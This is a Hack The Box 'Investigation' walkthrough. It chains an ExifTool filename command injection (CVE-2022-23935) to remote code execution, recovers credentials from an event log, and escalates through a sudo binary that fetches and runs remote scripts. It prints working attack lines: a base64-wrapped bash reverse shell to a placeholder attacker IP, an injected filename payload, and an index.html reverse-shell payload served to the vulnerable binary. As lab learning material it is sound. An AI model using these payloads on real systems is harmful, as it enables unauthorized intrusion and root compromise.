🕵️ HTB: Investigation – Full Walkthrough

⚡ TL;DR

    Exploited ExifTool v12.37 (CVE-2022-23935) to achieve RCE via image upload

    Recovered credentials from a .msg file containing an embedded .evtx log

    Parsed security.evtx with Chainsaw to extract login data

    Escalated privileges using a vulnerable binary executed with sudo

    Rooted the machine via command injection over HTTP

🔍 Enumeration

Started with a basic port scan:

nmap -sC -sV -Pn <target-ip>

Ports Open:

    22 SSH

    80 HTTP

Browsing port 80 revealed a basic website with an image upload functionality. Upload restrictions allowed only image file types, hinting at server-side file handling.
📷 Exploiting ExifTool (CVE-2022-23935)

After uploading an image, the site displayed its metadata—powered by ExifTool. The version (12.37) was exposed in the output.

A quick search confirmed it's vulnerable to command injection due to how Perl handles filenames. The payload is executed if malicious commands are embedded in the filename itself.

Test Payload:

Filename: |sleep 5

Verified via BurpSuite with a 5-second delay — confirming RCE.
🐚 Getting a Reverse Shell

Encoded a bash reverse shell in base64 to bypass input filtering:

bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1

Base64-encoded, then wrapped in:

echo <base64> | base64 -d | bash

Inserted this payload into the image filename, uploaded via Burp, and triggered it. Shell received as www-data.
📬 Analyzing the .msg File

Found a Microsoft Outlook message (.msg) on the server and downloaded it:

md5sum Email.msg  # Verified file integrity

Converted the .msg file using:

sudo apt install libemail-outlook-message-perl
msgconvert Email.msg

The resulting .eml file included a base64-encoded ZIP file named evt-logs.zip.b64.
📦 Extracting security.evtx

To clean the encoding format:

dos2unix evt-logs.zip.b64
base64 -d evt-logs.zip.b64 > evt-logs.zip
unzip evt-logs.zip

Inside was a Windows Event Log: security.evtx
🔍 Credential Extraction via Chainsaw

Used Chainsaw to parse login events:

./chainsaw search -t 'Event.System.EventID: =4625' security.evtx --json > failed-logins.json

Then extracted meaningful fields:

cat failed-logins.json | jq '.[].Event.EventData | "\(.LogonProcessName)\(.ProcessName) \(.TargetDomainName) \(.TargetUserName)"' -r | sort -u

Captured login attempts revealing a valid user:password combination.
🔐 Lateral Movement – Login as User

With valid credentials, switched from www-data to user smorton.
🔓 Privilege Escalation – Sudo Abuse

Ran:

sudo -l

Discovered sudo access to /usr/bin/binary — a custom 64-bit ELF binary.

Decompiled using Ghidra, the logic was as follows:

    Must be run with sudo

    Requires second argument: lDnxUysaQn

    Fetches remote payload via curl <arg> into a file

    Executes the file with perl

⚙️ Exploiting Binary

Prepared a payload delivery setup:

    Malicious script:

echo "bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1" > index.html

    Serve it:

python3 -m http.server 80

    Listener:

nc -lvnp <port>

    Exploit execution:

sudo /usr/bin/binary http://<attacker-ip>/index.html lDnxUysaQn

The binary fetched and executed the malicious HTML via Perl — resulting in a root shell.
🏁 Conclusion

    ✅ Initial Access: RCE via ExifTool filename injection

    ✅ Information Disclosure: Password extracted from .evtx using Chainsaw

    ✅ Privilege Escalation: Misconfigured binary allowed remote script execution via sudo

    ✅ Root Shell Acquired

🧠 Key Tools Used

    📦 ExifTool Exploit (CVE-2022-23935)

    🧰 Chainsaw for event log parsing

    🕵️ BurpSuite for testing upload injection

    🔬 Ghidra for binary analysis

    ⚙️ msgconvert & dos2unix for email decoding

🎉 Rooted HTB: Investigation
Status: ✅ Completed
Difficulty: Medium
Methodology: Logical, clean, privilege abuse via upload chain + weak binary logic
